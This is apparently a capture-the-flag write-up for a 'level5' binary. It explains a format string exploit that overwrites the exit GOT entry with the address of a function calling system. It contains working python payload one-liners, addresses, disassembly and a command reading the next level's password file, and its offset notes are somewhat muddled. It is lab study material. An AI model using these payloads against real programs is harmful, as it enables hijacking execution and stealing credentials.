- attack: format string exploitation using Global Offset Table
- binary behavior: fgets argument and send it to printf, if global argument = 64 run the shell
- targeted functions: v, o and main
- vulnerability in v: printf() without argument (Bugs section in printf man)
- defense1: fget
- defense2: function o with system call is non-called

Method:
- find the address of exit call in n
- find the address of o function
- find the exit (buffer) call position 
- write o function address instead of exit address through buffer
 
Info:
- positon of exit (buffer) in stack - 4
- 134513828 - same in decimal
- 080484a4 - address of o function
- 08049838 - address of exit function
- same in hex - \x38\x98\x04\x08

- offset code structure: 134513828 = 134513824 (o address) - 4 (buffer address)


Code:
objdump -d ./level5 # get the o function address
objdump -R level5 | grep exit # get the exit address
(python -c 'print "0000" + " %p" * 15'; cat) | ./level5
$(python -c 'print "\x38\x98\x04\x08" + "%134513824d" + "%4$n"'; )
python -c 'print "\x38\x98\x04\x08" + "%134513824d" + "%4$n"' > /tmp/ex ;  cat /tmp/ex - | ./level5

cat /home/user/level6/.pass
Functions

08048504 <main>:
 8048504:       55                      push   %ebp
 8048505:       89 e5                   mov    %esp,%ebp
 8048507:       83 e4 f0                and    $0xfffffff0,%esp
 804850a:       e8 b3 ff ff ff          call   80484c2 <n>
 804850f:       c9                      leave
 8048510:       c3                      ret

080484c2 <n>:
 80484c2:       55                      push   %ebp
 80484c3:       89 e5                   mov    %esp,%ebp
 80484c5:       81 ec 18 02 00 00       sub    $0x218,%esp
 80484cb:       a1 48 98 04 08          mov    0x8049848,%eax
 80484d0:       89 44 24 08             mov    %eax,0x8(%esp)
 80484d4:       c7 44 24 04 00 02 00    movl   $0x200,0x4(%esp)
 80484db:       00
 80484dc:       8d 85 f8 fd ff ff       lea    -0x208(%ebp),%eax
 80484e2:       89 04 24                mov    %eax,(%esp)
 80484e5:       e8 b6 fe ff ff          call   80483a0 <fgets@plt> # defence
 80484ea:       8d 85 f8 fd ff ff       lea    -0x208(%ebp),%eax
 80484f0:       89 04 24                mov    %eax,(%esp)
 80484f3:       e8 88 fe ff ff          call   8048380 <printf@plt> # exploit
 80484f8:       c7 04 24 01 00 00 00    movl   $0x1,(%esp)
 80484ff:       e8 cc fe ff ff          call   80483d0 <exit@plt> # exploit

 080484a4 <o>:
 80484a4:       55                      push   %ebp
 80484a5:       89 e5                   mov    %esp,%ebp
 80484a7:       83 ec 18                sub    $0x18,%esp
 80484aa:       c7 04 24 f0 85 04 08    movl   $0x80485f0,(%esp)
 80484b1:       e8 fa fe ff ff          call   80483b0 <system@plt> # exploit 
 80484b6:       c7 04 24 01 00 00 00    movl   $0x1,(%esp)
 80484bd:       e8 ce fe ff ff          call   8048390 <_exit@plt>

